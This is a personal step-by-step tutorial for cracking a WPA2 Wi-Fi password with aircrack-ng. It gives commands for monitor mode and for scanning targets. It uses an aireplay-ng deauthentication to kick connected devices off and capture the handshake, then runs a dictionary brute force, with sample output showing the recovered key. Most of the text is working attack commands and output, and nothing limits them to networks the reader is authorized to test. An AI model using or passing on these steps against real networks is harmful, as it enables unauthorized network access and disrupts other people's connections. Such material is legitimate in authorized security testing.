

### Crack wifi hotspot

⚠ most of the steps described here are to be run in super user mode

#### _I_ - Prerequisites
check that you have `airocrack` installed on your machine

#### _II_ - check your interfaces 
run  `airmon-ng` and chose a network interface, I used the one that says `[phy0]`. On my machine it was `wlp2s0`.

#### _III_ - Start an interface in monitor mode
run `airmon-ng start <your-interface> 9`
`9` is to start it in monitor mode.

I got this error 

```plaintext
Found 4 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode
```

I this case we can run `airmon-ng check kill`

Then we can try starting it again. (be careful the name is likely to have changed. Mine went from `wlp2s0` to `wlp2s0mon`)

#### _IV_ - Capture data

Now you want to get the mac address of the network you're trying to attack.

To do so you can run `airodump-ng <your-interface>`.

Find your network's BSSID (the MAC address of your Wi-Fi access point) and channel from the list.

#### _V_ - Capture packets

Now you will target your network specificaly :

```
airodump-ng -w psk --bssid <your_BSSID> -c <your_channel> <your_wireless_interface>
```

`BSSID` is the mac address of the network you're attacking.
`-w psk` will give us `.psk` files as output.
`your channel` is if you know the channel of the network, if not specified airodump will try different channels continuously.

You can get the channel of the AP with :
```
aireplay-ng -0 1 -a <network-address> -c <device-address> <your-interface>
```

⬆ This will in fact try to disconnect someone from the network. You will get the channel of the network and possibly a handshake this way


The output will look like this :

```plaintext
CH  5 ][ Elapsed: 2 mins ][ 2023-12-02 09:05

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 70:FC:8C:35:B0:9B  -42      192      111    0  11  195   WPA2 CCMP   PSK  <Name-of-the-network>

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 70:FC:8C:35:B0:9B  04:52:F1:27:F0:DE  -54   24e-24      0        4
 70:FC:8C:35:B0:9B  40:06:A3:59:7C:F9  -48   24e- 6      0       21
 70:FC:8C:35:B0:9B  1E:88:14:13:08:41  -30    1e- 1      0      157
 70:FC:8C:35:B0:9B  72:DB:3B:E3:E8:C9  -51    1e- 6e     0       52
```

This line is your network :

```plaintext
70:FC:8C:35:B0:9B  -42      192      111    0  11  195   WPA2 CCMP   PSK  <Name-of-the-network>
```

Thoses lines are the devices connected :

```plaintext
70:FC:8C:35:B0:9B  04:52:F1:27:F0:DE  -54   24e-24      0        4
70:FC:8C:35:B0:9B  40:06:A3:59:7C:F9  -48   24e- 6      0       21
70:FC:8C:35:B0:9B  1E:88:14:13:08:41  -30    1e- 1      0      157
70:FC:8C:35:B0:9B  72:DB:3B:E3:E8:C9  -51    1e- 6e     0       52
```

If it is empty you have to be patient and wait that someone connects.

#### _V_ - Wait for handshake

The thing you are waiting for is a 4-way-handshake in order to bruteforce the password locally.

Two ways to know you have got one :

The header will state :

```plaintext
CH 11 ][ Elapsed: 1 min ][ 2023-12-02 09:07 ][ WPA handshake: 70:FC:8C:35:B0:9B
```

A line will state `EAPOL` :

```
70:FC:8C:35:B0:9B  1E:88:14:13:08:41  -25    1e- 1      0      491  EAPOL
```

One you have this you can quit `airodump`.


#### _VI_ - Bruteforce the password

What you could do is to open wireshark, filter for `eapol`, find the hash and bruteforce it with hashcat, but the airocrack suite gives us tools to do it more quickly. Just run :

```plain
aircrack-ng -w password.tkt -b <your-bssid> psk*.cap
```

`password.txt` is your dictionary,
`<your-bssid>` is the mac address of the network.

```plaintext
Reading packets, please wait...
Opening psk-02.cap
Opening psk-01.cap
Opening psk-03.cap
Read 1062 packets.

1 potential targets

Resetting EAPOL Handshake decoder state.

                               Aircrack-ng 1.7

      [00:00:00] 2/12 keys tested (48.49 k/s)

      Time left: 0 seconds                                      16.67%

                       KEY FOUND! [ password1234 ]


      Master Key     : D0 9F 67 F5 88 CD 93 87 B9 C7 93 30 7A 94 CF 49
                       EA A5 78 A9 E2 F3 94 F2 42 A0 41 E8 E4 EF F8 55

      Transient Key  : 94 9C 2F 22 2A BD 03 19 A3 6D 07 0C 71 02 73 27
                       97 22 A3 69 E0 EA CC 95 2B 65 F3 64 AF C3 5A 81
                       5B 38 61 FA AC C8 CE 8B D9 C7 C8 AD 29 99 17 C4
                       23 4C C3 C6 93 6A CA 48 D9 42 2B 0B C6 F3 79 01

      EAPOL HMAC     : D2 9D 64 48 FE AB 29 88 27 F1 4E 35 E9 66 A1 3F
```


[How to crack wpa](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

#### _VII_ - Put your interface back in normal mode

Stop your monitor mode interface : 
`airmon-ng stop <monitor interface>`

Restart your NetworkManager :
`sudo systemctl start NetworkManager`